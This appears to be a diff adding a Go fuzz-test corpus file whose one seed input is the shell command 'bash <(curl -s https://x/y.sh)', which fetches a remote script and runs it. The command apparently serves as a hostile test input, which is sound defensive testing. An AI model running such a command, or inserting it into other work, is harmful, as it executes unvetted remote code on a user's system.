@@ -1,0 +1,2 @@
+go test fuzz v1
+[]byte("bash <(curl -s https://x/y.sh)")
